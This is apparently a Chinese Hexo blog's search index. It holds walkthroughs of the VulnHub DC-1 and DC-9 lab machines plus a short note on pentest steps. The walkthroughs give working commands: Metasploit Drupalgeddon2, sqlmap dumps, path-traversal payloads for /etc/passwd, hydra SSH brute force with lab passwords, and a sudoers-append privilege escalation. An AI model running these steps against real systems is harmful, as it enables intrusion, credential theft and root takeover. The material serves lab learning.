[{"title":"安全面试题","path":"/2024/04/01/面试题库/","content":"面试安全题","tags":["面试，护网"],"categories":["安全知识，题库"]},{"title":"DC-1","path":"/2024/04/01/la/","content":"环境搭建 准备工具 Kali DC-1靶场机安装 安装链接：https://www.vulnhub.com/entry/dc-1,292/ 安装过程 下载文件进行解压 解压完成直接使用虚拟机打开 提示导入失败，不过没有关系点重试就好，导入完成后，打开DC-1虚拟机并等待，过程中别点进虚拟机里面 出现这个界面就表示开启成功 （渗透完得到密码就能登入啦） 注意！！！！靶机和kali的接入模式必须要一致，比如都用net或者都用桥接，不懂的可以看这个（https://zhuanlan.zhihu.com/p/65103100） 渗透过程 这个过程需要用到kali，打开kali 信息收集 ①探测主机ip1ip a ②探测目标ip开放端口用nmap来探测 1nmap -sP 进行端口的扫描 1Nmap -P ③收集网页信息浏览器输入地址 利用火绒插件wappalyzer，查看站点信息，也可以自己判断，网页一看cms就是drupal 什么是cms？ CMS是”Content Management System”的缩写，意为”内容管理系统”。 它采用统一的信息组织的方法即分类，对同一类型的信息进行分类，且每一类信息都可以进行新建（Add）、查看（View）、编辑（Edit）和删除（Delete）四种不同的操作。除了使用分类的方式组织信息以外，又采用了统一的用户和权限管理对信息的使用进行控制，即构成了一个完整的信息组织和管理的体系。内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场. 漏洞查找与利用 什么是Drupal 知道cms，我们一般从cms出发找漏洞，百度一下drupal漏洞 或者在工具中打开 代开之后在里面搜索drupal 这里是drupal的漏洞 ①漏洞查找 用工具Metasploit（目前世界上领先的渗透测试工具，也是信息安全与渗透测试领域最大的开源项目之一），找一下漏洞，先打开工具 1metasploit 然后输入命令 1search Drupal 这些就是Drupal的漏洞，可以看到漏洞还挺多的 在这里面使用 1 exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2 2018-03-28 excellent Yes Drupal Drupalgeddon 2 Forms API Property Injection 这个脚本 输入：use 1 接着看一下该漏洞模块参数 1show options Current Setting是目前设置的内容 Required表示是否需要设置内容，yes为必须设置，no可以设置也可不设置 就上面来说RHOSTS需要set，但是没有内容 所以接着我们来设置一下RHOSTS内容（就是攻击目标IP地址，靶场地址） 1set RHOSTS 192.168.217.18 然后再show一下模块参数 设置好参数后开始攻击 1exploit exploit和run是一样的，用run也可以 出现Meterpreter session 1 opened（kali和目标ip的连接）就说明攻击成功啦，接下来我们可以直接上shell Getshell ①获取普通shell然后执行ls命令 ②获取交互shell这样看起来有点费劲，不过我们可以利用python实现互交shell，这样就好看一点，使用的前提是攻击主机上必须装有python “我不会安装python” 1python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 这是一个固定姿势，直接复制就能用 可以看到这个shell的权限只是普通权限，还不是root，不过还能看看文件啦，先看一下发现的flag1.txt文件 1cat flag1.txt 翻译过来就是：每个好的CMS都需要一个配置文件，你也一样，emmm，这个先放着，看看还有没有其他flag文件 我们再看看有没有其他flag文件 find / -name flag* 好吧只有一个，我们再看看他的配置文件，一般来说配置文件都有一些特别重要的信息在里面，搞不好还能提权，百度Drupal配置文件（每一个好的CMS都需要一个配置文件） 下一个攻克点提示在配置文件中 百度找到的durpal的配置文件是 &#x2F;vsr&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php 进入durpal配置文件 逐层解剖 找到flag2文件 进行读取 数据库渗透 发现第二个flag以及数据可以账号密码、咱们登录一下 mysql -udbuser -pR0ck3t mysql -u dbuser -p mysql -u dbuser -p Enter password: R0ck3t 登进去了，这样我们就可以为所欲为修改数据库了，先看看有啥好东西 1show databases; 接着使用该数据库，并查看表 use drupaldb;show tables; 注意到users这个表，看一下有啥，先改小一点字体，不然可能会挤爆不美观 1select * from users; 得到两个用户 1 | admin | S SSDvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR 2 | Fred | S SSDWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ&#x2F;9TCGg 密码好复杂，应该不是明文，那想登进后台就很难了就很难了，我们可以通过修改admin的密码，或者是新加一个admin 方法一：修改admin密码 我们得先找到加密文件，Drupal的加密脚本在 1/var/www/scripts/password-hash.sh 首先我推出mysql 1exit; 打开加密脚本 1cat /var/www/scripts/password-hash.sh 这个脚本是用php写的，而且还能用php加参数运行，直接得到加密后的密码，这里我们设置一个密码123456 1php /var/www/scripts/password-hash.sh 123456 得到加密后的密码， 接着我们登入mysql修改一下admin跟Fred的密码 mysql -udbuser -pR0ck3t use drupaldb;update users set pass &#x3D; “S SSD1UQvb3x7lKoCSX6S9K.r.wB202Lsa&#x2F;r7fkOj7CelJsSEMFDJjGv” where name &#x3D; ‘admin’ or name &#x3D; ‘Fred’; 接着我们用修改好的密码登入 登进去就找到了flag3，提示了我们一些信息passwd和shadow，明显就是linux的文件 &#x2F;etc&#x2F;passwd 该文件存储了系统用户的基本信息，所有用户都可以对其进行文件操作读 Linux &#x2F;etc&#x2F;passwd内容解释（超详细） &#x2F;etc&#x2F;shadow 该文件存储了系统用户的密码等信息，只有root权限用户才能读取 Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细） 1tac /etc/passwd 可以看到有flag4这个用户，我们有两个方法拿到这个用户的密码，一个是爆破，另一个就是提权打开shadow文件查看密码","categories":["靶场，DC系列"]},{"title":"DC-9","path":"/2024/04/01/DC-9/","content":"信息收集主机扫描1ip a 1nmap -sP 192.168.217.129/24 端口扫描1nmap 192.168.217.137 注意到ssh服务端口是filtered的，可能是什么原因给关掉了 目录扫描1dirsearch -u 192.168.217.137 -e * -x 403 --random-agent 页面探测暂时无图 探测结果： 发现Search页面搜索存在SQL注入（原因：在上传之后网址无任何变动，判断是post请求） 渗透过程SQ注入知道注入点，接下来上sqlmap跑，POST传参search，爆库 1sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; --current-db 得到数据库后进行爆表&#x2F;数据库：Staff 1sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -tables 爆字段 1sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -T &#x27;Users&#x27; -columns 爆值 1sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -T &#x27;Users&#x27; -C &#x27;Username,Password,UserID&#x27; -dump 只有一位用户，还有密码，这密码一看就是md5，接下来找个在线网站解密https://www.somd5.com/ 密码：transorbital1 登入后台 就多了个Add Record界面，注意到下面有File does not exist，想到是程序引用或读取了一个不存在的文件才会回显这个，接着用参数fuzz测试一下 burpsuite抓包，构建payload 1?§§=../../../../../etc/passwd 然后再把我们的参数字典加载进来 参数名是file，存在任意文件读取漏洞 端口敲门服务考虑到ssh端口是关闭的，可能是开启了knock服务（参考端口敲门服务），利用文件包含确认一下，一般开启了knock服务就会存在&#x2F;etc&#x2F;knockd.conf文件 构造payload 1/addrecord.php?file=../../../../../etc/knockd.conf 果然有，开启ssh服务得依次敲击7469,8475,9842端口，利用netcat进行敲击 1nc -z 192.168.217.137 7469 8475 9842 敲击完后发现端口打开了 shh爆破无奈测试了一下admin登不上去，想起之前SQLmap跑出过一个users的数据库 存放网站用户信息的，我们去瞧一下 1sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;users&#x27; -dump 用这些账号密码组成字典，爆破ssh 1vi ``username.txt marym julied fredf barneyr tomc jerrym wilmaf bettyr chandlerb joeyt rachelg rossg monicag phoebeb scoots janitor janitor2 1vi ``password.txt 3kfs86sfd 468sfdfsd2 4sfd87sfd1 RocksOff TC&amp;TheBoyz B8m#48sd Pebbles BamBam01 UrAG0D! Passw0rd yN72#dsd ILoveRachel 3248dsds7s smellycats YR3BVxxxw87 Ilovepeepee Hawaii-Five-0 接下来用九头蛇进行爆破 1hydra -L username.txt -P password.txt ssh://192.168.217.137 爆破出了三个用户 chandlerb:UrAG0D! joeyt:Passw0rd janitor:Ilovepeepee 尝试登入发现janitor用户有东西 123ls -lacd .s*cat * 有几个密码，复制到刚才的password文件继续爆破ssh vi password.txt BamBam01 Passw0rd smellycats P0Lic#10-4 B4-Tru3-001 4uGU5T-NiGHts 继续爆破 1hydra -L username.txt -P password.txt ssh://192.168.217.137 爆破出了一个新用户 fredf B4-Tru3-001 发现有个root权限文件 提权1cat /opt/devstuff/dist/test/test 打开test文件发现是一堆乱码，应该是一个程序 type name 可以查看文件类型，看是否是二进制还是文本文件 结果：啥也没看出来 在上两级目录发现test.py文件还有test.spec文件，所以后面目录下的test程序应该就是根据test.py文件写的，打开文件看一下test程序是干嘛的 该脚本的意思是打开用户输入的第二个文件，将第二个文件的内容追加保存到第三个文件里面，也就是说如果有命令是test.py a.txt b.txt，就会将a.txt的文件内容保存到b.txt里面 利用&#x2F;etc&#x2F;sudoers sudo配置文件&#x2F;etc&#x2F;sudoers详解及实战用法-CSDN博客 将fredf ALL&#x3D;(ALL:ALL) ALL写成一个文件a.ttx 将这个文件追加到&#x2F;etc&#x2F;sudoers 先将目录切换到有权限的&#x2F;home&#x2F;fredf 1cd /home/fredf 然后进行文件的创建的编辑 1vi a.ttx` 有人说在这里vi是个微型的，简单来说有坑，所以也可以用`nano a.ttx 写完就可进行&#x2F;home&#x2F;fredf的写入 1sudo /opt/devstuff/dist/test/test a.ttx /etc/sudoers 不显示就说明成功了 之后进行用户切换 1sudo su - sudo 就是尝试实行root权限 su就是提权 - 切换到环境变量里 然后输入用户fredf的密码就可以了 密码：B4-Tru3-001 之后就是寻找flag 12lscat theflag.txt","tags":["靶场"],"categories":["靶场，DC系列"]},{"title":"好杂","path":"/2024/03/31/ni-hao/","content":"很杂很杂 渗漏测试流程 明确目标 信息收集 域名，子域名，端口，网络架构，网站目录结构。。。。。。。 漏洞分析&#x2F;漏洞扫描&#x2F;寻找漏洞 漏洞利用 Http 80 Https 443 域名 IP 端口 cms指纹 网络空间测绘 目录扫描 网络空间测绘： 钟馗之眼&#x2F;首页 - ZoomEye 真地图，网络空间地图的全球领导者 fofa&#x2F;网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统 quake.360.cn&#x2F;首页 - ZoomEye 真地图，网络空间地图的全球领导者 鹰图&#x2F;https://hunter.qianxin.com/","tags":["Hexo"],"categories":["Blog"]},{"title":"使用Hexo搭建个人博客","path":"/2024/03/30/My-Blog/","content":"第一篇博客​\t今日不同往时，生死看淡，不服就干，奥里给！！！！！！","tags":["Hexo"],"categories":["Blog"]},{"title":"Hello World","path":"/2024/03/30/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment"}]